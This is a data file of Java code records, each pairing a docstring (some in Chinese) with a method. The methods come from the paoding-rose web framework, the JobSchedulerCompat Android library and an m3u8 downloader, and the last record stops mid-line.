{"docstring": "/*\n * \u6784\u9020\u4e00\u4e2a\u6811\uff0c\u6811\u7684\u7ed3\u70b9\u662f\u5730\u5740-\u8d44\u6e90\u6620\u5c04\uff0c\u6bcf\u4e2a\u7ed3\u70b9\u90fd\u80fd\u56de\u7b54\u662f\u5426\u5339\u914d\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e2a\u5339\u914d\u7684\u8282\u70b9\u90fd\u77e5\u9053\u5982\u4f55\u6267\u884c\u5bf9\u8be5\u8d44\u6e90\u7684\u64cd\u4f5c.\n * \u6784\u9020\u6811\u7684\u8fc7\u7a0b\uff1a\n *   \u8bc6\u522b\u7ec4\u4ef6==>\u6c42\u5f97\u4ed6\u7684\u8d44\u6e90\u5b9a\u4e49==>\u5224\u65ad\u662f\u5426\u5df2\u7ecf\u521b\u5efa\u4e86==>\u672a\u521b\u5efa\u7684\u521b\u5efa\u4e00\u4e2a\u6811\u7ed3\u70b9==>\u5df2\u521b\u5efa\u7684\u627e\u51fa\u8fd9\u4e2a\u7ed3\u70b9\n *   ==>\u5728\u8fd9\u4e2a\u8d44\u6e90\u589e\u52a0\u76f8\u5e94\u7684\u64cd\u4f5c\u4ee5\u53ca\u903b\u8f91==>\u82e5\u662f\u65b0\u5efa\u7684\u7ed3\u70b9\u628a\u5b83\u52a0\u5230\u6811\u4e2d\uff0c\u540c\u65f6\u6ee1\u8db3\u904d\u5386\u3001\u5339\u914d\u987a\u5e8f\u8981\u6c42\n */\n", "func_signal": "public void create(MappingNode tree, List<Module> modules)", "code": "{\n    addRoot(tree, modules);\n    check(tree, tree, \"\");\n}", "path": "paoding-rose-web\\src\\main\\java\\net\\paoding\\rose\\web\\impl\\mapping\\TreeBuilder.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "// ReplacementInterpreter\n", "func_signal": "public static void main(String[] args) throws Exception", "code": "{\n    Map<String, Object> parameters = new HashMap<String, Object>();\n    parameters.put(\"table\", \"my_table_name\");\n    parameters.put(\"id\", \"my_id\");\n    parameters.put(\":1\", \"first_param\");\n\n    final Pattern PATTERN = Pattern.compile(\"\\\\{([a-zA-Z0-9_\\\\.\\\\:]+)\\\\}|##\\\\((.+)\\\\)\");\n\n    String sql = \"select form ##(:table) {name} where {id}='{1}'\";\n\n    StringBuilder sb = new StringBuilder(sql.length() + 200);\n    Matcher matcher = PATTERN.matcher(sql);\n    int start = 0;\n    while (matcher.find(start)) {\n        sb.append(sql.substring(start, matcher.start()));\n        String group = matcher.group();\n        String key = null;\n        if (group.startsWith(\"{\")) {\n            key = matcher.group(1);\n        } else if (group.startsWith(\"##(\")) {\n            key = matcher.group(2);\n        }\n        System.out.println(key);\n        if (key == null || key.length() == 0) {\n            continue;\n        }\n        Object value = parameters.get(key); // \u9488\u5bf9{paramName}\u3001{:1}\u4e24\u79cd\u60c5\u51b5\n        if (value == null) {\n            if (key.startsWith(\":\") || key.startsWith(\"$\")) {\n                value = parameters.get(key.substring(1)); // \u9488\u5bf9{:paramName}\u7684\u60c5\u51b5\n            } else {\n                char ch = key.charAt(0);\n                if (ch >= '0' && ch <= '9') {\n                    value = parameters.get(\":\" + key); // \u9488\u5bf9{1}\u4e24\u79cd\u60c5\u51b5\n                }\n            }\n        }\n        if (value == null) {\n            value = parameters.get(key); // \u9488\u5bf9\u5e38\u91cf\u7684\u60c5\u51b5\n        }\n        if (value != null) {\n            sb.append(value);\n        } else {\n            sb.append(group);\n        }\n        start = matcher.end();\n    }\n    sb.append(sql.substring(start));\n    System.out.println(sb);\n\n}\n\n// ExqlInterpreter\npublic static void main0(String[] args) throws Exception {\n    // \u8f6c\u6362\u8bed\u53e5\u4e2d\u7684\u8868\u8fbe\u5f0f\n    String sql = \"insert ignore into table_name \"\n                 + \"(`id`,`uid`,`favable_id`,`addtime`,`ranking`) \"//\n                 + \"values (:1,:2,now(),0)\";\n    ExqlPattern pattern = ExqlPatternImpl.compile(sql);\n    ExqlContextImpl context = new ExqlContextImpl();\n\n    Map<String, Object> parametersAsMap = new HashMap<String, Object>();\n    parametersAsMap.put(\":1\", \"p1\");\n    parametersAsMap.put(\":2\", \"p2\");\n\n    pattern.execute(context, parametersAsMap);\n    String result = context.flushOut();\n    System.out.println(result);\n}\n\n}", "path": "paoding-rose-jade\\src\\main\\java\\net\\paoding\\rose\\jade\\statement\\SystemInterpreter.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "// \u4f18\u5148\u83b7\u53d6queryString\u6216forward\u4e4b\u540e\u7684\u8bf7\u6c42\u7684\u53c2\u6570\uff0c\u53ea\u6709\u83b7\u53d6\u4e0d\u5230\u65f6\uff0c\u624d\u4eceURI\u91cc\u83b7\u53d6\n", "func_signal": "@Override\npublic String getParameter(String name)", "code": "{\n    String value = super.getParameter(name);\n    if (value == null) {\n        value = parameters.get(name);\n    }\n    return value;\n}", "path": "paoding-rose-web\\src\\main\\java\\net\\paoding\\rose\\web\\impl\\thread\\ParameteredUriRequest.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "/**\n * \u521d\u59cb\u5316\u7684\u65f6\u5019\u6765\u51b3\u5b9a\u6240\u6709\u7684\u5224\u65ad\u6761\u4ef6\uff0c\u5e76\u62bd\u8c61\u4e3a{@link ParamExistenceChecker}\u6570\u7ec4\n * \n * @return\n */\n", "func_signal": "private ParamExistenceChecker[] compileParamExistenceChecker()", "code": "{\n\n    IfParamExists ifParamExists = method.getAnnotation(IfParamExists.class);\n    //\u6ca1\u6807\u6ce8IfParamExists\u6216\u8005\u6807\u6ce8\u4e86IfParamExists(\"\")\u90fd\u8ba4\u4e3a\u4e0d\u4f5c\u68c0\u67e5\n    if (ifParamExists == null || ifParamExists.value().trim().length() == 0) {\n        return new ParamExistenceChecker[] {};\n    }\n\n    List<ParamExistenceChecker> checkers = new ArrayList<ParamExistenceChecker>(); //\u6240\u6709\u5224\u65ad\u6761\u4ef6\u7684\u5217\u8868\n    String value = ifParamExists.value();\n\n    //\u53ef\u4ee5\u5199\u591a\u4e2a\u5224\u65ad\u6761\u4ef6\uff0c\u4ee5\u8fd9\u6837\u7684\u5f62\u5f0f: type&subtype=value&anothername=value2\n    String[] terms = StringUtils.split(value, \"&\");\n    Assert.isTrue(terms.length >= 1); //\u8fd9\u4e2a\u5e94\u8be5\u6c38\u8fdc\u6210\u7acb\n\n    //\u6309'&'\u5206\u5272\u540e\uff0c\u6bcf\u4e00\u4e2aterm\u5c31\u662f\u4e00\u4e2a\u68c0\u67e5\u6761\u4ef6\n    for (final String term : terms) {\n        final int index = term.indexOf('='); //\u627e'='\n        if (index == -1) { //\u6ca1\u6709=\u8bf4\u660e\u53ea\u6709\u53c2\u6570\u540d\uff0c\u6b64\u65f6term\u5c31\u662f\u53c2\u6570\u540d\n            checkers.add(new ParamExistenceChecker() {\n\n                final String paramName = term.trim();\n\n                @Override\n                public int check(Map<String, String[]> params) {\n                    String[] paramValues = params.get(paramName);\n                    if (logger.isDebugEnabled()) {\n                        logger.debug(this.toString() + \" is checking param:\" + paramName + \"=\"\n                                + Arrays.toString(paramValues));\n                    }\n\n                    //\u89c4\u5219\u4e2d\u6ca1\u6709\u7ea6\u675f\u53c2\u6570\u503c\uff0c\u6240\u4ee5\u53ea\u8981\u5b58\u5728\u5c31ok\n                    if (paramValues != null && paramValues.length > 0) {\n                        return 10;\n                    } else {\n                        return -1;\n                    }\n                }\n            });\n        } else { //term\u4e2d\u6709'='\n\n            final String paramName = term.substring(0, index).trim(); //\u53c2\u6570\u540d\n            final String expected = term.substring(index + 1).trim(); //\u671f\u671b\u7684\u53c2\u6570\u503c\n\n            if (expected.startsWith(\":\")) { //expected\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\n                Pattern tmpPattern = null;\n                try {\n                    tmpPattern = Pattern.compile(expected.substring(1));\n                } catch (PatternSyntaxException e) {\n                    logger.error(\"@IfParamExists pattern error, \" + controllerClass.getName()\n                            + \"#\" + method.getName(), e);\n                }\n                final Pattern pattern = tmpPattern; //\u8f6c\u6210final\u7684\n                checkers.add(new ParamExistenceChecker() {\n\n                    @Override\n                    public int check(Map<String, String[]> params) {\n                        String[] paramValues = params.get(paramName);\n                        if (logger.isDebugEnabled()) {\n                            logger.debug(this.toString() + \" is checking param:\" + paramName\n                                    + \"=\" + Arrays.toString(paramValues) + \", pattern=\"\n                                    + pattern.pattern());\n                        }\n                        if (paramValues == null) { //\u53c2\u6570\u503c\u4e0d\u80fd\u5b58\u5728\u5c31\u4e0d\u80fd\u901a\u8fc7\n                            return -1;\n                        }\n\n                        for (String paramValue : paramValues) {\n                            if (pattern != null && pattern.matcher(paramValue).matches()) {\n                                return 12;\n                            }\n                        }\n                        return -1;\n                    }\n                });\n            } else { //expected\u662f\u5e38\u91cf\u5b57\u7b26\u4e32\uff0c\u5305\u62ec\u7a7a\u4e32\"\"\n                checkers.add(new ParamExistenceChecker() {\n\n                    @Override\n                    public int check(Map<String, String[]> params) {\n                        String[] paramValues = params.get(paramName);\n                        if (logger.isDebugEnabled()) {\n                            logger.debug(this.toString() + \" is checking param:\" + paramName\n                                    + \"=\" + Arrays.toString(paramValues) + \", expected=\"\n                                    + expected);\n                        }\n                        if (paramValues == null) { //\u53c2\u6570\u503c\u4e0d\u80fd\u5b58\u5728\u5c31\u4e0d\u80fd\u901a\u8fc7\n                            return -1;\n                        }\n\n                        for (String paramValue : paramValues) {\n                            if (expected.equals(paramValue)) {\n                                return 13;// 13\u4f18\u5148\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u768412\n                            }\n                        }\n                        return -1;\n                    }\n                });\n            }\n        }\n    }\n    return checkers.toArray(new ParamExistenceChecker[] {});\n}", "path": "paoding-rose-web\\src\\main\\java\\net\\paoding\\rose\\web\\impl\\thread\\ActionEngine.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "/**\n * \u6784\u9020\u4e00\u4e2aholder\u5b9e\u4f8b\uff0c\u6240\u63d0\u4f9b\u7684\u53c2\u6570\u5fc5\u987b\u662f {@link DataSource} \u6216\n * {@link DataSourceFactory}\u7c7b\u578b\n * \n * @throws IllegalArgumentException\n * \n * @param dataSourceOrItsFactory\n */\n", "func_signal": "public DataSourceHolder(Object dataSourceOrItsFactory)", "code": "{\n    if (dataSourceOrItsFactory instanceof DataSource) {\n        this.dataSource = (DataSource) dataSourceOrItsFactory;\n        this.dataSourceFactory = null;\n        return;\n    }\n    if (dataSourceOrItsFactory instanceof DataSourceFactory) {\n        this.dataSource = null;\n        this.dataSourceFactory = (DataSourceFactory) dataSourceOrItsFactory;\n        return;\n    }\n    throw new IllegalArgumentException(\"\" + dataSourceOrItsFactory);\n}", "path": "paoding-rose-jade\\src\\main\\java\\net\\paoding\\rose\\jade\\dataaccess\\DataSourceHolder.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "/**\n * Call this as soon as we get a chance, it will be unregistered whenever our app is killed.\n */\n", "func_signal": "public static void enableReceiver(Context context)", "code": "{\n    IntentFilter filter = getFilter();\n    sReceiver = new IdleReceiver();\n    context.getApplicationContext().registerReceiver(sReceiver, filter);\n}", "path": "jobscheduler\\src\\main\\java\\me\\tatarka\\support\\internal\\receivers\\IdleReceiver.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * Convenience function to read out and convert deadline and delay from xml into elapsed real\n * time.\n *\n * @return A {@link android.util.Pair}, where the first value is the earliest elapsed runtime\n * and the second is the latest elapsed runtime.\n */\n", "func_signal": "private Pair<Long, Long> buildExecutionTimesFromXml(XmlPullParser parser)\n        throws NumberFormatException", "code": "{\n    // Pull out execution time data.\n    final long nowWallclock = System.currentTimeMillis();\n    final long nowElapsed = SystemClock.elapsedRealtime();\n\n    long earliestRunTimeElapsed = JobStatus.NO_EARLIEST_RUNTIME;\n    long latestRunTimeElapsed = JobStatus.NO_LATEST_RUNTIME;\n    String val = parser.getAttributeValue(null, \"deadline\");\n    if (val != null) {\n        long latestRuntimeWallclock = Long.valueOf(val);\n        long maxDelayElapsed =\n                Math.max(latestRuntimeWallclock - nowWallclock, 0);\n        latestRunTimeElapsed = nowElapsed + maxDelayElapsed;\n    }\n    val = parser.getAttributeValue(null, \"delay\");\n    if (val != null) {\n        long earliestRuntimeWallclock = Long.valueOf(val);\n        long minDelayElapsed =\n                Math.max(earliestRuntimeWallclock - nowWallclock, 0);\n        earliestRunTimeElapsed = nowElapsed + minDelayElapsed;\n\n    }\n    return Pair.create(earliestRunTimeElapsed, latestRunTimeElapsed);\n}", "path": "jobscheduler\\src\\main\\java\\me\\tatarka\\support\\internal\\job\\JobStore.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * @param parser Xml parser at the beginning of a \"<job/>\" tag. The next \"parser.next()\" call\n *               will take the parser into the body of the job tag.\n * @return Newly instantiated job holding all the information we just read out of the xml tag.\n */\n", "func_signal": "private JobStatus restoreJobFromXml(XmlPullParser parser) throws XmlPullParserException,\n        IOException", "code": "{\n    JobInfo.Builder jobBuilder;\n\n    // Read out job identifier attributes.\n    try {\n        jobBuilder = buildBuilderFromXml(parser);\n    } catch (NumberFormatException e) {\n        return null;\n    }\n\n    int eventType;\n    // Read out constraints tag.\n    do {\n        eventType = parser.next();\n    } while (eventType == XmlPullParser.TEXT);  // Push through to next START_TAG.\n\n    if (!(eventType == XmlPullParser.START_TAG &&\n            XML_TAG_PARAMS_CONSTRAINTS.equals(parser.getName()))) {\n        // Expecting a <constraints> start tag.\n        return null;\n    }\n    try {\n        buildConstraintsFromXml(jobBuilder, parser);\n    } catch (NumberFormatException e) {\n        return null;\n    }\n    parser.next(); // Consume </constraints>\n\n    // Read out execution parameters tag.\n    do {\n        eventType = parser.next();\n    } while (eventType == XmlPullParser.TEXT);\n    if (eventType != XmlPullParser.START_TAG) {\n        return null;\n    }\n\n    Pair<Long, Long> runtimes;\n    try {\n        runtimes = buildExecutionTimesFromXml(parser);\n    } catch (NumberFormatException e) {\n        return null;\n    }\n\n    if (XML_TAG_PERIODIC.equals(parser.getName())) {\n        try {\n            String val = parser.getAttributeValue(null, \"period\");\n            jobBuilder.setPeriodic(Long.valueOf(val));\n        } catch (NumberFormatException e) {\n            return null;\n        }\n    } else if (XML_TAG_ONEOFF.equals(parser.getName())) {\n        try {\n            if (runtimes.first != JobStatus.NO_EARLIEST_RUNTIME) {\n                jobBuilder.setMinimumLatency(runtimes.first - SystemClock.elapsedRealtime());\n            }\n            if (runtimes.second != JobStatus.NO_LATEST_RUNTIME) {\n                jobBuilder.setOverrideDeadline(\n                        runtimes.second - SystemClock.elapsedRealtime());\n            }\n        } catch (NumberFormatException e) {\n            return null;\n        }\n    } else {\n        // Expecting a parameters start tag.\n        return null;\n    }\n\n    String persisted = parser.getAttributeValue(null, \"persisted\");\n    if (persisted != null) {\n        jobBuilder.setPersisted(Boolean.valueOf(persisted));\n    }\n\n    maybeBuildBackoffPolicyFromXml(jobBuilder, parser);\n\n    parser.nextTag(); // Consume parameters end tag.\n\n    // Read out extras Bundle.\n    do {\n        eventType = parser.next();\n    } while (eventType == XmlPullParser.TEXT);\n    if (!(eventType == XmlPullParser.START_TAG && XML_TAG_EXTRAS.equals(parser.getName()))) {\n        return null;\n    }\n\n    PersistableBundle extras = PersistableBundle.restoreFromXml(parser);\n    jobBuilder.setExtras(extras);\n    parser.nextTag(); // Consume </extras>\n\n    return new JobStatus(jobBuilder.build(), runtimes.first, runtimes.second);\n}", "path": "jobscheduler\\src\\main\\java\\me\\tatarka\\support\\internal\\job\\JobStore.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * Write out a tag with data comprising the required fields of this job and its client.\n */\n", "func_signal": "private void addIdentifierAttributesToJobTag(XmlSerializer out, JobStatus jobStatus)\n        throws IOException", "code": "{\n    out.attribute(null, \"jobid\", Integer.toString(jobStatus.getJobId()));\n    out.attribute(null, \"package\", jobStatus.getServiceComponent().getPackageName());\n    out.attribute(null, \"class\", jobStatus.getServiceComponent().getClassName());\n}", "path": "jobscheduler\\src\\main\\java\\me\\tatarka\\support\\internal\\job\\JobStore.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * Receives callback from the service when a job that previously landed on the app must stop\n * executing. Colours the UI and post a message to uncolour it after a second.\n */\n", "func_signal": "public void onReceivedStopJob()", "code": "{\n    mShowStopView.setBackgroundColor(stopJobColor);\n    Message m = Message.obtain(mHandler, MSG_UNCOLOUR_STOP);\n    mHandler.sendMessageDelayed(m, 2000L); // uncolour in 1 second.\n    mParamsTextView.setText(\"\");\n}", "path": "app\\src\\main\\java\\me\\tatarka\\support\\job\\sample\\MainActivity.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * Write out a tag with data identifying this job's constraints. If the constraint isn't here\n * it doesn't apply.\n */\n", "func_signal": "private void writeConstraintsToXml(XmlSerializer out, JobStatus jobStatus) throws IOException", "code": "{\n    out.startTag(null, XML_TAG_PARAMS_CONSTRAINTS);\n    if (jobStatus.hasUnmeteredConstraint()) {\n        out.attribute(null, \"unmetered\", Boolean.toString(true));\n    }\n    if (jobStatus.hasConnectivityConstraint()) {\n        out.attribute(null, \"connectivity\", Boolean.toString(true));\n    }\n    if (jobStatus.hasIdleConstraint()) {\n        out.attribute(null, \"idle\", Boolean.toString(true));\n    }\n    if (jobStatus.hasChargingConstraint()) {\n        out.attribute(null, \"charging\", Boolean.toString(true));\n    }\n    out.endTag(null, XML_TAG_PARAMS_CONSTRAINTS);\n}", "path": "jobscheduler\\src\\main\\java\\me\\tatarka\\support\\internal\\job\\JobStore.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * Callback to inform the JobManager you've finished executing. This can be called from any\n * thread, as it will ultimately be run on your application's main thread. When the system\n * receives this message it will release the wakelock being held.\n * <p>\n * You can specify post-execution behaviour to the scheduler here with\n * <code>needsReschedule </code>. This will apply a back-off timer to your job based on\n * the default, or what was set with\n * {@link android.app.job.JobInfo.Builder#setBackoffCriteria(long, int)}. The original\n * requirements are always honoured even for a backed-off job. Note that a job running in\n * idle mode will not be backed-off. Instead what will happen is the job will be re-added\n * to the queue and re-executed within a future idle maintenance window.\n * </p>\n *\n * @param params          Parameters specifying system-provided info about this job, this was given to\n *                        your application in {@link #onStartJob(JobParameters)}.\n * @param needsReschedule True if this job should be rescheduled according to the back-off\n *                        criteria specified at schedule-time. False otherwise.\n */\n", "func_signal": "public final void jobFinished(JobParameters params, boolean needsReschedule)", "code": "{\n    ensureHandler();\n    Message m = Message.obtain(mHandler, MSG_JOB_FINISHED, params);\n    m.arg2 = needsReschedule ? 1 : 0;\n    m.sendToTarget();\n}", "path": "jobscheduler\\src\\main\\java\\me\\tatarka\\support\\job\\JobService.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "// getCallback() is a hidden method on JobParameters, so use reflection to get at it.\n", "func_signal": "private static android.app.job.IJobCallback getCallback(android.app.job.JobParameters params)", "code": "{\n    Method method;\n    try {\n        method = params.getClass().getDeclaredMethod(\"getCallback\");\n        method.setAccessible(true);\n        return (android.app.job.IJobCallback) method.invoke(params);\n    } catch (NoSuchMethodException e) {\n        throw new RuntimeException(e);\n    } catch (InvocationTargetException e) {\n        throw new RuntimeException(e);\n    } catch (IllegalAccessException e) {\n        throw new RuntimeException(e);\n    }\n}", "path": "jobscheduler\\src\\main\\java\\me\\tatarka\\support\\internal\\IJobServiceCompat.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * UI onclick listener to call jobFinished() in our service.\n */\n", "func_signal": "public void finishJob(View v)", "code": "{\n    if (!ensureTestService()) {\n        return;\n    }\n    mTestService.callJobFinished();\n    mParamsTextView.setText(\"\");\n}", "path": "app\\src\\main\\java\\me\\tatarka\\support\\job\\sample\\MainActivity.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/** @hide */\n", "func_signal": "public JobParameters(IBinder callback, int jobId, PersistableBundle extras,\n                     boolean overrideDeadlineExpired)", "code": "{\n    this.jobId = jobId;\n    this.extras = extras;\n    this.callback = callback;\n    this.overrideDeadlineExpired = overrideDeadlineExpired;\n}", "path": "jobscheduler\\src\\main\\java\\me\\tatarka\\support\\job\\JobParameters.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * @param jobId Job id, specified at schedule-time.\n * @return the JobStatus that matches the provided uId and jobId, or null if none found.\n */\n", "func_signal": "public JobStatus getJobByJobId(int jobId)", "code": "{\n    Iterator<JobStatus> it = mJobSet.iterator();\n    while (it.hasNext()) {\n        JobStatus ts = it.next();\n        if (ts.matches(jobId)) {\n            return ts;\n        }\n    }\n    return null;\n}", "path": "jobscheduler\\src\\main\\java\\me\\tatarka\\support\\internal\\job\\JobStore.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * Add a job to the master list, persisting it if necessary. If the JobStatus already exists,\n * it will be replaced.\n *\n * @param jobStatus Job to add.\n * @return Whether or not an equivalent JobStatus was replaced by this operation.\n */\n", "func_signal": "public boolean add(JobStatus jobStatus)", "code": "{\n    boolean replaced = mJobSet.remove(jobStatus);\n    mJobSet.add(jobStatus);\n    if (!jobStatus.isPersisted()) {\n        markForBootSession(jobStatus);\n    }\n    maybeWriteStatusToDiskAsync();\n    return replaced;\n}", "path": "jobscheduler\\src\\main\\java\\me\\tatarka\\support\\internal\\job\\JobStore.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * Receives callback from the service when a job has landed on the app. Colours the UI and post\n * a message to uncolour it after a second.\n */\n", "func_signal": "public void onReceivedStartJob(JobParameters params)", "code": "{\n    mShowStartView.setBackgroundColor(startJobColor);\n    Message m = Message.obtain(mHandler, MSG_UNCOLOUR_START);\n    mHandler.sendMessageDelayed(m, 1000L); // uncolour in 1 second.\n    mParamsTextView.setText(\"Executing: \" + params.getJobId() + \" \" + params.getExtras());\n}", "path": "app\\src\\main\\java\\me\\tatarka\\support\\job\\sample\\MainActivity.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * Every time the state changes we write all the jobs in one swath, instead of trying to\n * track incremental changes.\n *\n * @return Whether the operation was successful. This will only fail for e.g. if the system is\n * low on storage. If this happens, we continue as normal\n */\n", "func_signal": "private void maybeWriteStatusToDiskAsync()", "code": "{\n    mDirtyOperations++;\n    if (mDirtyOperations >= MAX_OPS_BEFORE_WRITE) {\n        mIoHandler.post(new WriteJobsMapToDiskRunnable());\n    }\n}", "path": "jobscheduler\\src\\main\\java\\me\\tatarka\\support\\internal\\job\\JobStore.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * @hide\n */\n", "func_signal": "@Override\npublic void writeUnknownObject(Object v, String name, XmlSerializer out) throws XmlPullParserException, IOException", "code": "{\n    if (v instanceof PersistableBundle) {\n        out.startTag(null, TAG_PERSISTABLEMAP);\n        out.attribute(null, \"name\", name);\n        ((PersistableBundle) v).saveToXml(out);\n        out.endTag(null, TAG_PERSISTABLEMAP);\n    } else {\n        throw new XmlPullParserException(\"Unknown Object o=\" + v);\n    }\n}", "path": "jobscheduler\\src\\main\\java\\me\\tatarka\\support\\os\\PersistableBundle.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * Whether this jobStatus object already exists in the JobStore.\n */\n", "func_signal": "public boolean containsJobId(int jobId)", "code": "{\n    for (int i = mJobSet.size() - 1; i >= 0; i--) {\n        JobStatus ts = mJobSet.valueAt(i);\n        if (ts.matches(jobId)) {\n            return true;\n        }\n    }\n    return false;\n}", "path": "jobscheduler\\src\\main\\java\\me\\tatarka\\support\\internal\\job\\JobStore.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * @hide\n */\n", "func_signal": "public void saveToXml(XmlSerializer out) throws IOException, XmlPullParserException", "code": "{\n    Map map = new HashMap();\n    for (String key : keySet()) {\n        map.put(key, get(key));\n    }\n    XmlUtils.writeMapXml(map, out, this);\n}", "path": "jobscheduler\\src\\main\\java\\me\\tatarka\\support\\os\\PersistableBundle.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * Builds the back-off policy out of the params tag. These attributes may not exist, depending\n * on whether the back-off was set when the job was first scheduled.\n */\n", "func_signal": "private void maybeBuildBackoffPolicyFromXml(JobInfo.Builder jobBuilder, XmlPullParser parser)", "code": "{\n    String val = parser.getAttributeValue(null, \"initial-backoff\");\n    if (val != null) {\n        long initialBackoff = Long.valueOf(val);\n        val = parser.getAttributeValue(null, \"backoff-policy\");\n        int backoffPolicy = Integer.valueOf(val);  // Will throw NFE which we catch higher up.\n        jobBuilder.setBackoffCriteria(initialBackoff, backoffPolicy);\n    }\n}", "path": "jobscheduler\\src\\main\\java\\me\\tatarka\\support\\internal\\job\\JobStore.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * Constructs a PersistableBundle containing the mappings passed in.\n *\n * @param map a Map containing only those items that can be persisted.\n * @throws IllegalArgumentException if any element of #map cannot be persisted.\n */\n", "func_signal": "private PersistableBundle(Map<String, Object> map)", "code": "{\n    bundle = PersistableBundleCompat.newInstance();\n    putAll(map);\n}", "path": "jobscheduler\\src\\main\\java\\me\\tatarka\\support\\os\\PersistableBundle.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * UI onclick listener to schedule a job. What this job is is defined in\n * TestJobService#scheduleJob().\n */\n", "func_signal": "public void scheduleJob(View v)", "code": "{\n    if (!ensureTestService()) {\n        return;\n    }\n\n    JobInfo.Builder builder = new JobInfo.Builder(kJobId++, mServiceComponent);\n\n    String delay = mDelayEditText.getText().toString();\n    if (delay != null && !TextUtils.isEmpty(delay)) {\n        builder.setMinimumLatency(Long.valueOf(delay) * 1000);\n    }\n    String deadline = mDeadlineEditText.getText().toString();\n    if (deadline != null && !TextUtils.isEmpty(deadline)) {\n        builder.setOverrideDeadline(Long.valueOf(deadline) * 1000);\n    }\n    String period = mPeriodEditText.getText().toString();\n    if (period != null && !TextUtils.isEmpty(period)) {\n        builder.setPeriodic(Long.valueOf(period) * 1000);\n    }\n    boolean requiresUnmetered = mWiFiConnectivityRadioButton.isChecked();\n    boolean requiresAnyConnectivity = mAnyConnectivityRadioButton.isChecked();\n    if (requiresUnmetered) {\n        builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_UNMETERED);\n    } else if (requiresAnyConnectivity) {\n        builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);\n    }\n    builder.setRequiresDeviceIdle(mRequiresIdleCheckbox.isChecked());\n    builder.setRequiresCharging(mRequiresChargingCheckBox.isChecked());\n    builder.setPersisted(mPersistedCheckbox.isChecked());\n\n    String backoffTime = mBackoffDelayEditText.getText().toString();\n    if (backoffTime != null && !TextUtils.isEmpty(backoffTime)) {\n        int backoffPolicy = mBackoffLinearRadioButton.isChecked() ? JobInfo.BACKOFF_POLICY_LINEAR : JobInfo.BACKOFF_POLICY_EXPONENTIAL;\n        builder.setBackoffCriteria(Long.valueOf(backoffTime) * 1000, backoffPolicy);\n    }\n\n    try {\n        mTestService.scheduleJob(builder.build());\n    } catch (IllegalArgumentException e) {\n        Toast.makeText(this, e.getMessage(), Toast.LENGTH_SHORT).show();\n    } catch (IllegalStateException e) {\n        Toast.makeText(this, e.getMessage(), Toast.LENGTH_SHORT).show();\n    }\n}", "path": "app\\src\\main\\java\\me\\tatarka\\support\\job\\sample\\MainActivity.java", "repo_name": "evant/JobSchedulerCompat", "stars": 735, "license": "apache-2.0", "language": "java", "size": 701}
{"docstring": "/**\n * \u5f00\u59cb\u4e0b\u8f7d\u4e86\n */\n", "func_signal": "private synchronized void startDownload(final long startDwonloadTime, final long endDownloadTime)", "code": "{\n    mHandler.sendEmptyMessage(WHAT_ON_START);\n    isRunning = true;//\u5f00\u59cb\u4e0b\u8f7d\u4e86\n    new Thread() {\n        @Override\n        public void run() {\n            try {\n                M3U8 m3u8 = null;\n                try {\n                    m3u8 = MUtils.parseIndex(url);\n                    m3u8.setStartDownloadTime(startDwonloadTime);\n                    m3u8.setEndDownloadTime(endDownloadTime);\n                    sendM3u8Info(m3u8);\n                } catch (Exception e) {\n                    handlerError(e);\n                    return;\n                }\n                if (executor != null && executor.isTerminated()) {\n                    executor.shutdownNow();\n                    executor = null;\n                }\n                executor = Executors.newFixedThreadPool(10);\n                if (isRunning()) {\n                    download(m3u8, 